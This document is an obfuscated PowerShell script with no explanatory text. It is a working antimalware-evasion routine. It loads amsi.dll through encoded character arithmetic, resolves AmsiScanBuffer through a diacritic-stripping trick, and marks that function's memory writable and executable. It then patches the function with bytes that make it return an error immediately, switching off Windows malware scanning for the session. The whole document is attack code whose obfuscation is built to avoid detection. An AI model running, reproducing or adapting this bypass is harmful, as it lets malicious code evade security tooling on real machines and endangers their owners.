$thQk3cBx = @"
using System;
using System.Runtime.InteropServices;
public class thQk3cBx {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr VPsr, string KWf6_Z7N5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr wf0ojA, UIntPtr D61cy, uint snYU6Pkj, out uint yKOIi3IA);
}
"@

Add-Type $thQk3cBx

$Icd0QA = [thQk3cBx]::LoadLibrary("$([CHAr]([BytE]0x61)+[cHAr](109)+[ChAr](10+105)+[ChAR](105)+[ChAr]([BYtE]0x2e)+[chAR](100*46/46)+[CHar](48+60)+[Char]([ByTE]0x6c))")
$VU5Nv31lpOcvVI1E = [thQk3cBx]::GetProcAddress($Icd0QA, "$(('ÄmsîScânBûf'+'fér').NORmAlIZE([CHaR](70)+[cHar](111+6-6)+[ChAR]([ByTe]0x72)+[chaR](109*44/44)+[CHAR](68+46-46)) -replace [ChAr]([BYtE]0x5c)+[cHAr]([BytE]0x70)+[CHaR](123+85-85)+[CHaR]([Byte]0x4d)+[cHAr]([byTe]0x6e)+[CHAr](125))")
$p = 0
[thQk3cBx]::VirtualProtect($VU5Nv31lpOcvVI1E, [uint32]5, 0x40, [ref]$p)
$DeFy2m04Vj0y = "0xB8"
$KZk = "0x57"
$jmU4WyloIj = "0x00"
$SmVCFDpzq = "0x07"
$HRM0jGn8O1Mf = "0x80"
$IWngN1XR1WJVXKWef = "0xC3"
$DKNG3IaW = [Byte[]] ($DeFy2m04Vj0y,$KZk,$jmU4WyloIj,$SmVCFDpzq,+$HRM0jGn8O1Mf,+$IWngN1XR1WJVXKWef)
[System.Runtime.InteropServices.Marshal]::Copy($DKNG3IaW, 0, $VU5Nv31lpOcvVI1E, 6)